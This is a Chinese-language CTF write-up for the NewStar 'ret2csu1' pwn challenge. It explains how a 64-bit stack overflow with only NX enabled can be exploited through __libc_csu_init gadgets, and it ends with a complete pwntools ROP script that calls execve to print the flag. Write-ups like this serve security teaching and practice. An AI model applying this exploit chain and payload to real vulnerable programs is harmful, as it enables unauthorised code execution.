---
title: ret2csu1
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- stackoverflow
- ROP
---
NewStar，ret2csu

<!--more-->

64位栈溢出，保护都只开了NX，message大小为0x20却可以输入0x70。

有一个后门，但是参数不对，可以尝试栈溢出修改寄存器的值后再调用execve。

```c
void __cdecl ohMyBackdoor(__int64_t a, __int64_t b, __int64_t c)
{
  signed __int64 v3; // rax

  if ( a == 'Fallw1nd' && b == 'WantsAGI' && c == 'rlfriend' )
    v3 = sys_execve((const char *)'Fallw1nd', (const char *const *)b, (const char *const *)'rlfriend');
}
```

要修改三个参数不太容易，要用到__libc_csu_init中的gadget。

```c
0x0000000000400710 <+64>: mov    rdx,r15
0x0000000000400713 <+67>: mov    rsi,r14
0x0000000000400716 <+70>: mov    edi,r13d
0x0000000000400719 <+73>: call   QWORD PTR [r12+rbx*8]
0x000000000040071d <+77>: add    rbx,0x1
0x0000000000400721 <+81>: cmp    rbp,rbx
0x0000000000400724 <+84>: jne    0x400710 <__libc_csu_init+64>
0x0000000000400726 <+86>: add    rsp,0x8
0x000000000040072a <+90>: pop    rbx
0x000000000040072b <+91>: pop    rbp
0x000000000040072c <+92>: pop    r12
0x000000000040072e <+94>: pop    r13
0x0000000000400730 <+96>: pop    r14
0x0000000000400732 <+98>: pop    r15
0x0000000000400734 <+100>: ret 
```

从0x40072a开始可以控制rbx,rbp,r12,r13,r14,r15，之后程序控制返回0x400710可以将r15,r14,r13d的内容放入rdx,rsi,rdi，并调用r12+rbx*8指向位置的指令。

我们知道64位程序中rdi,rsi,rdx用于存放前三个参数。因此，我们只要将前三个参数放入r13,r14,r15，再把要执行的指令放入r12，设置rbx为0，即可执行*(void*)r12(r13d,r14,r15)。

要注意的是r13只会传入低4字节，不过本题中的第一个参数的地址只有三字节，没影响。

此外，execve的详细内容也可以看一下。

```c
int execve(const char *file,char *const argv[],char *const envp[])
int main(int argc,char* argv[])
```

execve有三个参数，第一个file是要打开的文件路径，第二个argv是传入的参数，第三个envp是环境变量。execve会将当前进程的内存映像替换为file指向的文件，并将argv作为其main函数的参数argv，环境变量通常为0(NULL)。

一般来说如果调用execve("/bin/sh",0,0)可以直接获得shell。

不过如果要使用argv的话，会有些不同，要写成execve("/bin/sh",{"/bin/sh","file",0})，此时shell会**作为一个shell脚本解释器**来分析file这个路径指向的文件。**argv**的第一个参数要**和执行的程序一样**（此处为"/bin/sh"），第二个参数是分析的sh文件的**路径**，第三个参数是0，如果出错了可以将错误内容从stderr输出。

因此在本题中，使用的是"/bin/cat"，argv={"/bin/cat","flag",NULL}。execve("/bin/cat",{"/bin/cat","flag",NULL},0),这样就可以把flag文件打印出来了

```python
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
#libc=ELF('')
p=process('./'+filename)
#p=remote('',)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

argv=0x601050#gift2->{"/bin/sh","flag",0}
cat=0x00000000004007BB#gift1->/bin/cat
execv=0x0000000000601068 #gift3->0x400648
pop_addr=0x000000000040072a
mov_addr=0x0000000000400710

payload='a'*0x20+p64(0)+p64(pop_addr)+p64(0)+p64(1)+p64(execv)+p64(cat)+p64(argv)+p64(0)+p64(mov_addr)
debug()
#r()
sl(payload)
itr()
```
